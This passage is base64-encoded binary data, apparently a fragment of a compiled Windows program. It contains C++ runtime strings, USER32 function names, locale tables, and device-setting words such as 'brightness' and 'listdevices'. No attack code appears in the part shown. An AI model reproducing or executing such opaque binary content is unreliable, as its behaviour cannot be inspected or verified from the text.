zdHJ1Y3RvcicAAAAAYGRlZmF1bHQgY29uc3RydWN0b3IgY2xvc3VyZScAAABgc2NhbGFyIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAYGVoIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGNvcHkgY29uc3RydWN0b3IgY2xvc3VyZScAAGB1ZHQgcmV0dXJuaW5nJwBgRUgAYFJUVEkAAABgbG9jYWwgdmZ0YWJsZScAYGxvY2FsIHZmdGFibGUgY29uc3RydWN0b3IgY2xvc3VyZScAIG5ld1tdAAAgZGVsZXRlW10AAABgb21uaSBjYWxsc2lnJwAAYHBsYWNlbWVudCBkZWxldGUgY2xvc3VyZScAAGBwbGFjZW1lbnQgZGVsZXRlW10gY2xvc3VyZScAAAAAYG1hbmFnZWQgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBtYW5hZ2VkIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAYGR5bmFtaWMgYXRleGl0IGRlc3RydWN0b3IgZm9yICcAAAAAYHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgbWFuYWdlZCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBsb2NhbCBzdGF0aWMgdGhyZWFkIGd1YXJkJwAgVHlwZSBEZXNjcmlwdG9yJwAAACBCYXNlIENsYXNzIERlc2NyaXB0b3IgYXQgKAAgQmFzZSBDbGFzcyBBcnJheScAACBDbGFzcyBIaWVyYXJjaHkgRGVzY3JpcHRvcicAAAAAIENvbXBsZXRlIE9iamVjdCBMb2NhdG9yJwAAAFUAUwBFAFIAMwAyAC4ARABMAEwAAAAAAE1lc3NhZ2VCb3hXAEdldEFjdGl2ZVdpbmRvdwBHZXRMYXN0QWN0aXZlUG9wdXAAAEdldFVzZXJPYmplY3RJbmZvcm1hdGlvblcAAABHZXRQcm9jZXNzV2luZG93U3RhdGlvbgAAAAAAAAAAAAAAAAAAAADA//81wmghotoPyf8/AAAAAAAA8D8IBAgICAQICAAEDAgABAwIAAAAAAAAAAAAAPA/fwI1wmghotoPyT5A////////738AAAAAAAAQAAAAAAAAAJjAAAAAAAAAmEAAAAAAAADwfwAAAAAAAAAAZSswMDAAAAAAAAAAAQAAAPCfQQACAAAA+J9BAAMAAAAAoEEABAAAAAigQQAFAAAAGKBBAAYAAAAgoEEABwAAACigQQAIAAAAMKBBAAkAAAA4oEEACgAAAECgQQALAAAASKBBAAwAAABQoEEADQAAAFigQQAOAAAAYKBBAA8AAABooEEAEAAAAHCgQQARAAAAeKBBABIAAACAoEEAEwAAAIigQQAUAAAAkKBBABUAAACYoEEAFgAAAKCgQQAYAAAAqKBBABkAAACwoEEAGgAAALigQQAbAAAAwKBBABwAAADIoEEAHQAAANCgQQAeAAAA2KBBAB8AAADgoEEAIAAAAOigQQAhAAAA8KBBACIAAAD4oEEAIwAAAAChQQAkAAAACKFBACUAAAAQoUEAJgAAABihQQAnAAAAIKFBACkAAAAooUEAKgAAADChQQArAAAAOKFBACwAAABAoUEALQAAAEihQQAvAAAAUKFBADYAAABYoUEANwAAAGChQQA4AAAAaKFBADkAAABwoUEAPgAAAHihQQA/AAAAgKFBAEAAAACIoUEAQQAAAJChQQBDAAAAmKFBAEQAAACgoUEARgAAAKihQQBHAAAAsKFBAEkAAAC4oUEASgAAAMChQQBLAAAAyKFBAE4AAADQoUEATwAAANihQQBQAAAA4KFBAFYAAADooUEAVwAAAPChQQBaAAAA+KFBAGUAAAAAokEAfwAAAGzhQQABBAAACKJBAAIEAAAUokEAAwQAACCiQQAEBAAAeIVBAAUEAAAsokEABgQAADiiQQAHBAAARKJBAAgEAABQokEACQQAANSIQQALBAAAXKJBAAwEAABookEADQQAAHSiQQAOBAAAgKJBAA8EAACMokEAEAQAAJiiQQARBAAAVIVBABIEAABshUEAEwQAAKSiQQAUBAAAsKJBABUEAAC8okEAFgQAAMiiQQAYBAAA1KJBABkEAADgokEAGgQAAOyiQQAbBAAA+KJBABwEAAAEo0EAHQQAABCjQQAeBAAAHKNBAB8EAAAoo0EAIAQAADSjQQAhBAAAQKNBACIEAABMo0EAIwQAAFijQQAkBAAAZKNBACUEAABwo0EAJgQAAHyjQQAnBAAAiKNBACkEAACUo0EAKgQAAKCjQQArBAAArKNBACwEAAC4o0EALQQAANCjQQAvBAAA3KNBADIEAADoo0EANAQAAPSjQQA1BAAAAKRBADYEAAAMpEEANwQAABikQQA4BAAAJKRBADkEAAAwpEEAOgQAADykQQA7BAAASKRBAD4EAABUpEEAPwQAAGCkQQBABAAAbKRBAEEEAAB4pEEAQwQAAISkQQBEBAAAnKRBAEUEAACopEEARgQAALSkQQBHBAAAwKRBAEkEAADMpEEASgQAANikQQBLBAAA5KRBAEwEAADwpEEATgQAAPykQQBPBAAACKVBAFAEAAAUpUEAUgQAACClQQBWBAAALKVBAFcEAAA4pUEAWgQAAEilQQBlBAAAWKVBAGsEAABopUEAbAQAAHilQQCBBAAAhKVBAAEIAACQpUEABAgAAGCFQQAHCAAAnKVBAAkIAACopUEACggAALSlQQAMCAAAwKVBABAIAADMpUEAEwgAANilQQAUCAAA5KVBABYIAADwpUEAGggAAPylQQAdCAAAFKZBACwIAAAgpkEAOwgAADimQQA+CAAARKZBAEMIAABQpkEAawgAAGimQQABDAAAeKZBAAQMAACEpkEABwwAAJCmQQAJDAAAnKZBAAoMAACopkEADAwAALSmQQAaDAAAwKZBADsMAADYpkEAawwAAOSmQQABEAAA9KZBAAQQAAAAp0EABxAAAAynQQAJEAAAGKdBAAoQAAAkp0EADBAAADCnQQAaEAAAPKdBADsQAABIp0E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AAAAAAGsAbgAAAAAAbQByAAAAAABzAGEAAAAAAG0AbgAAAAAAZwBsAAAAAABrAG8AawAAAHMAeQByAAAAZABpAHYAAABhAHIALQBTAEEAAABiAGcALQBCAEcAAABjAGEALQBFAFMAAABjAHMALQBDAFoAAABkAGEALQBEAEsAAABkAGUALQBEAEUAAABlAGwALQBHAFIAAABmAGkALQBGAEkAAABmAHIALQBGAFIAAABoAGUALQBJAEwAAABoAHUALQBIAFUAAABpAHMALQBJAFMAAABpAHQALQBJAFQAAABuAGwALQBOAEwAAABuAGIALQBOAE8AAABwAGwALQBQAEwAAABwAHQALQBCAFIAAAByAG8ALQBSAE8AAAByAHUALQBSAFUAAABoAHIALQBIAFIAAABzAGsALQBTAEsAAABzAHEALQBBAEwAAABzAHYALQBTAEUAAAB0AGgALQBUAEgAAAB0AHIALQBUAFIAAAB1AHIALQBQAEsAAABpAGQALQBJAEQAAAB1AGsALQBVAEEAAABiAGUALQBCAFkAAABzAGwALQBTAEkAAABlAHQALQBFAEUAAABsAHYALQBMAFYAAABsAHQALQBMAFQAAABmAGEALQBJAFIAAAB2AGkALQBWAE4AAABoAHkALQBBAE0AAABhAHoALQBBAFoALQBMAGEAdABuAAAAAABlAHUALQBFAFMAAABtAGsALQBNAEsAAAB0AG4ALQBaAEEAAAB4AGgALQBaAEEAAAB6AHUALQBaAEEAAABhAGYALQBaAEEAAABrAGEALQBHAEUAAABmAG8ALQBGAE8AAABoAGkALQBJAE4AAABtAHQALQBNAFQAAABzAGUALQBOAE8AAABtAHMALQBNAFkAAABrAGsALQBLAFoAAABrAHkALQBLAEcAAABzAHcALQBLAEUAAAB1AHoALQBVAFoALQBMAGEAdABuAAAAAAB0AHQALQBSAFUAAABiAG4ALQBJAE4AAABwAGEALQBJAE4AAABnAHUALQBJAE4AAAB0AGEALQBJAE4AAAB0AGUALQBJAE4AAABrAG4ALQBJAE4AAABtAGwALQBJAE4AAABtAHIALQBJAE4AAABzAGEALQBJAE4AAABtAG4ALQBNAE4AAABjAHkALQBHAEIAAABnAGwALQBFAFMAAABrAG8AawAtAEkATgAAAAAAcwB5AHIALQBTAFkAAAAAAGQAaQB2AC0ATQBWAAAAAABxAHUAegAtAEIATwAAAAAAbgBzAC0AWgBBAAAAbQBpAC0ATgBaAAAAYQByAC0ASQBRAAAAZABlAC0AQwBIAAAAZQBuAC0ARwBCAAAAZQBzAC0ATQBYAAAAZgByAC0AQgBFAAAAaQB0AC0AQwBIAAAAbgBsAC0AQgBFAAAAbgBuAC0ATgBPAAAAcAB0AC0AUABUAAAAcwByAC0AUwBQAC0ATABhAHQAbgAAAAAAcwB2AC0ARgBJAAAAYQB6AC0AQQBaAC0AQwB5AHIAbAAAAAAAcwBlAC0AUwBFAAAAbQBzAC0AQgBOAAAAdQB6AC0AVQBaAC0AQwB5AHIAbAAAAAAAcQB1AHoALQBFAEMAAAAAAGEAcgAtAEUARwAAAHoAaAAtAEgASwAAAGQAZQAtAEEAVAAAAGUAbgAtAEEAVQAAAGUAcwAtAEUAUwAAAGYAcgAtAEMAQQAAAHMAcgAtAFMAUAAtAEMAeQByAGwAAAAAAHMAZQAtAEYASQAAAHEAdQB6AC0AUABFAAAAAABhAHIALQBMAFkAAAB6AGgALQBTAEcAAABkAGUALQBMAFUAAABlAG4ALQBDAEEAAABlAHMALQBHAFQAAABmAHIALQBDAEgAAABoAHIALQBCAEEAAABzAG0AagAtAE4ATwAAAAAAYQByAC0ARABaAAAAegBoAC0ATQBPAAAAZABlAC0ATABJAAAAZQBuAC0ATgBaAAAAZQBzAC0AQwBSAAAAZgByAC0ATABVAAAAYgBzAC0AQgBBAC0ATABhAHQAbgAAAAAAcwBtAGoALQBTAEUAAAAAAGEAcgAtAE0AQQAAAGUAbgAtAEkARQAAAGUAcwAtAFAAQQAAAGYAcgAtAE0AQwAAAHMAcgAtAEIAQQAtAEwAYQB0AG4AAAAAAHMAbQBhAC0ATgBPAAAAAABhAHIALQBUAE4AAABlAG4ALQBaAEEAAABlAHMALQBEAE8AAABzAHIALQBCAEEALQBDAHkAcgBsAAAAAABzAG0AYQAtAFMARQAAAAAAYQByAC0ATwBNAAAAZQBuAC0ASgBNAAAAZQBzAC0AVgBFAAAAcwBtAHMALQBGAEkAAAAAAGEAcgAtAFkARQAAAGUAbgAtAEMAQgAAAGUAcwAtAEMATwAAAHMAbQBuAC0ARgBJAAAAAABhAHIALQBTAFkAAABlAG4ALQBCAFoAAABlAHMALQBQAEUAAABhAHIALQBKAE8AAABlAG4ALQBUAFQAAABlAHMALQBBAFIAAABhAHIALQBMAEIAAABlAG4ALQBaAFcAAABlAHMALQBFAEMAAABhAHIALQBLAFcAAABlAG4ALQBQAEgAAABlAHMALQBDAEwAAABhAHIALQBBAEUAAABlAHMALQBVAFkAAABhAHIALQBCAEgAAABlAHMALQBQAFkAAABhAHIALQBRAEEAAABlAHMALQBCAE8AAABlAHMALQBTAFYAAABlAHMALQBIAE4AAABlAHMALQBOAEkAAABlAHMALQBQAFIAAAB6AGgALQBDAEgAVAAAAAAAcwByAAAAAABhAGYALQB6AGEAAABhAHIALQBhAGUAAABhAHIALQBiAGgAAABhAHIALQBkAHoAAABhAHIALQBlAGcAAABhAHIALQBpAHEAAABhAHIALQBqAG8AAABhAHIALQBrAHcAAABhAHIALQBsAGIAAABhAHIALQBsAHkAAABhAHIALQBtAGEAAABhAHIALQBvAG0AAABhAHIALQBxAGEAAABhAHIALQBzAGEAAABhAHIALQBzAHkAAABhAHIALQB0AG4AAABhAHIALQB5AGUAAABhAHoALQBhAHoALQBjAHkAcgBsAAAAAABhAHoALQBhAHoALQBsAGEAdABuAAAAAABiAGUALQBiAHkAAABiAGcALQBiAGcAAABiAG4ALQBpAG4AAABiAHMALQBiAGEALQBsAGEAdABuAAAAAABjAGEALQBlAHMAAABjAHMALQBjAHoAAABjAHkALQBnAGIAAABkAGEALQBkAGsAAABkAGUALQBhAHQAAABkAGUALQBjAGgAAABkAGUALQBkAGUAAABkAGUALQBsAGkAAABkAGUALQBsAHUAAABkAGkAdgAtAG0AdgAAAAAAZQBsAC0AZwByAAAAZQBuAC0AYQB1AAAAZQBuAC0AYgB6AAAAZQBuAC0AYwBhAAAAZQBuAC0AYwBiAAAAZQBuAC0AZwBiAAAAZQBuAC0AaQBlAAAAZQBuAC0AagBtAAAAZQBuAC0AbgB6AAAAZQBuAC0AcABoAAAAZQBuAC0AdAB0AAAAZQBuAC0AdQBzAAAAZQBuAC0AegBhAAAAZQBuAC0AegB3AAA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AIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEAgQCBAIEAgQCBAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAQABAAEAAQABAAEACCAIIAggCCAIIAggACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAEAAQABAAEAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgACgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAhACEAIQAhACEAIQAEAAQABAAEAAQABAAEACBAYEBgQGBAYEBgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBEAAQABAAEAAQABAAggGCAYIBggGCAYIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECARAAEAAQABAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAACAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEQAAEBAQEBAQEBAQEBAQEBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBEAACAQIBAgECAQIBAgECAQIBAQEAAAAAgIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6W1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/QQAAABcAAABDAE8ATgBPAFUAVAAkAAAAKG51bGwpAAAoAG4AdQBsAGwAKQAAAAAABgAABgABAAAQAAMGAAYCEARFRUUFBQUFBTUwAFAAAAAAKCA4UFgHCAA3MDBXUAcAACAgCAAAAAAIYGhgYGBgAAB4cHh4eHgIBwgAAAcACAgIAAAIAAgABwgAAAAAAAAABoCAhoCBgAAAEAOGgIaCgBQFBUVFRYWFhQUAADAwgFCAiAAIACgnOFBXgAAHADcwMFBQiAAAACAogIiAgAAAAGBoYGhoaAgIB3hwcHdwcAgIAAAIAAgABwgAAAAxI1NOQU4AADEjSU5EAAAAMSNJTkYAAAAxI1FOQU4AAGIAcgBpAGcAaAB0AG4AZQBzAHMAAAAAAGMAbwBuAHQAcgBhAHMAdAAAAAAAZABlAHYAaQBjAGUAAAAAAGwAaQBzAHQAZABlAHYAaQBjAGUAcwAAAGwAaQBzAHQAcAByAG8AcABlAHIAdA